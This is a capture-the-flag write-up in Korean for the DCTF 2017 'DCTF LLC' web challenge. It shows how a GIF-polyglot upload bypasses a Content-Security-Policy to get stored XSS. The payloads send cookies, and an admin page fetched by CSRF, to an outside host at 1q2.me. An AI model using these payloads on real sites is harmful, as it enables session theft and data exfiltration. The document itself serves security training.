# [WEB] DCTF 2017 - DCTF LLC

# Description
We are looking for your feedback about our new amazing company! :-) 
Update 11:00 EEST: Do you see what the "admin" is seeing?

# Analysis
문제 페이지에 접속하면 이름, 이메일, 내용 그리고 파일을 하나 첨부할 수 있다.
파일의 경우 500kb미만의 파일과 이미지 파일만 지원하며 간단한 테스트를 해본 결과 File signature만 체크한다.
> 참고 : https://en.wikipedia.org/wiki/List_of_file_signatures

우선 파일을 업로드 하고 Submit하면 Response Header에 재밌는 부분이 생성된다.
```
content-encoding:gzip
content-length:1159
content-security-policy:default-src 'none'; img-src 'self' *.imgur.com *.ibb.co; script-src 'self'; connect-src 'self'; style-src 'self' fonts.googleapis.com fonts.gstatic.com 'unsafe-inline'; font-src 'self' fonts.gstatic.com  fonts.googleapis.com;
content-type:text/html; charset=UTF-8
date:Wed, 04 Oct 2017 05:46:17 GMT
server:nginx/1.10.3 (Ubuntu)
status:200
strict-transport-security:max-age=31536000; includeSubdomains
vary:Accept-Encoding
x-content-type-options:nosniff
x-frame-options:DENY
x-xss-protection:1; mode=block
```
주의해서 볼 헤더는 `content-security-policy`이다.
페이지에서 img태그 쓸 시에 참조할 외부 자원은 서버 내, \*.imgur.com, \*.ibb.co이며,
script쓸 시 참조할 외부 자원은 서버 내 뿐이다.
즉 content-security-polity헤더를 통해 외부 자원을 차단하는 것이다.
하지만 우리는 파일을 업로드 할 수 있으며, 그 파일은 **서버 내부**에 들어가게 된다.
우리는 이를 이용하여 script를 통해 서버에서 불러올 수 있게 된다.

# Exploit
1. XSS using image upload

## 1. XSS using image upload
우선 다음과 같은 gif파일을 하나 생성한다.
```
GIF89a=0;location.href='http://1q2.me:10101/'+document.cookie;
```

이제 생성한 파일을 서버에 업로드하여 Submit하면 업로드된 이미지의 경로를 확인할 수 있다.
```html
<h4>Message Sent. Here's the preview:</h4>
<div>
    Name: shpik<br>
    Email: shpik.korea@gmail.com<br>
    Message: HELLO<br>
    <img src="__3a4bf53d037ba88515303ad785fe0c94/LLC.gif">
</div>
```

파일의 경로를 확인하였으니 Message부분에 XSS를 일으키는 페이로드를 삽입하여 Submit한다.
```html
<script src="__3a4bf53d037ba88515303ad785fe0c94/LLC.gif"></script>
```

수행 결과 cookie에는 내용이 없지만, Request Header에서 또 다른 정보를 얻을 수 있었다.
```
Accept-Encoding: gzip
Connect-Time: 1
Via: 1.1 vegur
Cf-Ray: 3a7bb8703f8e0f81-FRA
Cf-Connecting-Ip: 45.76.95.55
Cf-Visitor: {"scheme":"https"}
X-Request-Id: ec71d7c7-de29-4dd4-aca9-5186fa95060e
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Host: requestb.in
Connection: close
Cookie: __cfduid=d8c8eca22ffed482d0d816ebe7ae673731506696251
Accept-Language: en-US,*
Cf-Ipcountry: DE
Total-Route-Time: 0
Referer: https://llc.dctf-quals-17.def.camp//bot.php?id=3059
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
```

Referer을 보면 bot.php에 의해 해당 스크립트가 실행된 것을 확인할 수 있다.
근데 cookie를 안가지고 있으니, bot을 통해 무언가를 요청해야 할 것 같다.
게싱으로 admin.php를 요청해보니 404가 안뜨길래 이를 요청하기로 했다.
이제 다시 gif의 내용을 변경하여 CSRF를 시도해보자.
```
GIF89a=0;var xhr=new XMLHttpRequest();xhr.open('get','admin.php',false);xhr.send();location.href='http://1q2.me:10101/'+btoa(xhr.responseText);
```

해당 gif를 업로드하고 위와 같은 방법으로 message의 내용으로 Submit한다.
```html
<script src="__6b885533665dcce41bb6c47f22d1d5d1/LLC.gif"></script>
```

서버에서 기다리면 다음과 같은 결과를 받을 수 있다.
`RENURns4MDhmNTBjYTNmMzE4MmEzMGU3NmJiOWZjYzBmZGNiN2Y3NWY0Y2U1OTdmN2FiZTE3OTNlMzk0MmFjZjNlYzllfQ==`

이를 base64 decode하면 flag를 얻을 수 있다.

**DCTF{808f50ca3f3182a30e76bb9fcc0fdcb7f75f4ce597f7abe1793e3942acf3ec9e}**

